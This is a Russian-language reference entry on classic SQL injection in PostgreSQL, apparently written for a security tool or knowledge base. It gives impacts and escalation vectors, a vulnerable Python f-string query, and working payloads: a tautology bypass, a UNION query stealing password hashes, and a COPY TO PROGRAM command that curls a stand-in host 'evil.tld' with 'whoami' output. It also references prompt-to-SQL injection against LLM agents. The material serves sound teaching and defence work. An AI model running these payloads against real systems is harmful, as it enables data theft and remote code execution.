# 01 — SQL Injection (классический)

- **`vuln_class`:** `SQL_INJ_CLASSIC`
- **Риск:** 10/10
- **CWE:** [CWE-89 — Improper Neutralization of Special Elements](https://cwe.mitre.org/data/definitions/89.html)
- **CAPEC:** [CAPEC-66 — SQL Injection](https://capec.mitre.org/data/definitions/66.html)
- **OWASP:** [SQLi Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html), Top 10 A05:2025.

## Что

Динамическая склейка **недоверенного пользовательского ввода** в текст SQL-запроса без параметризации. Самая опасная форма SQLi: даёт исполнить произвольный SQL в контексте прав приложения.

Канонический пример из ТЗ (`tusk` § «Классы уязвимостей»): «динамическая конкатенация пользовательского ввода без параметризации».

## Почему опасно (риск 10)

| Воздействие | Что может атакующий |
|---|---|
| Чтение | Любая таблица в схеме, к которой есть `SELECT` у роли приложения. Полная схема через `information_schema`. |
| Изменение | `UPDATE`/`DELETE` строк, если у роли есть права. |
| Уничтожение | `DROP TABLE`, `TRUNCATE` — при широких правах. |
| Эскалация | Через `pg_read_server_files`, `COPY FROM PROGRAM`, `lo_import` → RCE на хосте БД (см. [CAPEC-470](https://capec.mitre.org/data/definitions/470.html)). |
| Боковое движение | Если роль имеет `SECURITY DEFINER` функции — захват их привилегий. |

Риск 10 = критический. Один успешный эксплойт = полный компромисс данных.

## PostgreSQL specifics

PostgreSQL даёт атакующему дополнительные векторы по сравнению с MySQL/MSSQL:

- **`||`** — оператор конкатенации строк. Любая склейка `'...' || $param` потенциально опасна.
- **`COPY FROM PROGRAM 'cmd'`** — выполнение shell-команды от имени `postgres`-процесса (если роль superuser).
- **`pg_read_server_files()` / `lo_import()`** — чтение файлов с диска.
- **`$$`-quoting** (dollar-quoted strings) — частая попытка «сэкономить на экранировании», тоже не спасает.
- **Stacked queries**: в PostgreSQL по протоколу wire-frontend разделение через `;` обычно ограничено, но в `EXECUTE` внутри PL/pgSQL — работает (отдельная проблема, см. [06-plpgsql-unsafe-execute](../06-plpgsql-unsafe-execute/)).
- **Type casting**: `'1' OR true::text::int = 1` — байпасы через каст.

## Пример атаки

**Антипаттерн (host-код):**
```python
def get_user(login: str):
    cursor.execute(f"SELECT * FROM users WHERE login = '{login}'")
```

**Payload:**
```
login = "admin' OR '1'='1' -- "
```
**Итоговый SQL:**
```sql
SELECT * FROM users WHERE login = 'admin' OR '1'='1' -- '
```
→ возвращает всех пользователей.

**Усиленный payload (PostgreSQL):**
```
login = "x' UNION SELECT password_hash, NULL FROM auth.credentials -- "
```
→ кража хешей паролей.

**Эскалация (если роль superuser):**
```
login = "x'; COPY (SELECT '') TO PROGRAM 'curl https://evil.tld/$(whoami)' -- "
```
→ RCE.

## Внешние ссылки

- **CWE/CAPEC/OWASP** — в шапке.
- **research/materials/04-security-attacks/p2sql-injection-langchain/** — prompt-to-SQL injection в LLM-агентах.
- **research/materials/05-security-benchmarks-datasets/rbsqli-10m/** — 10M реальных SQLi payloads.
- **research/materials/05-security-benchmarks-datasets/sqlqueryshield/** — CodeBERT-классификатор malicious vs benign.
- **research/materials/04-security-attacks/gsqli-gan-waf-bypass/** — GAN-мутации payloads (для negative-тестов).
- **research/materials/06-postgres-cves/cve-2025-1094-libpq-escaping/** — обход escape-функций libpq на encoding-уровне.
- **PortSwigger PG cheat sheet** — каталог payloads.
- **sqlmap** — payloads/error_based, union_query, stacked_queries, time_blind.

## Варианты решения

См. [solutions.md](solutions.md).
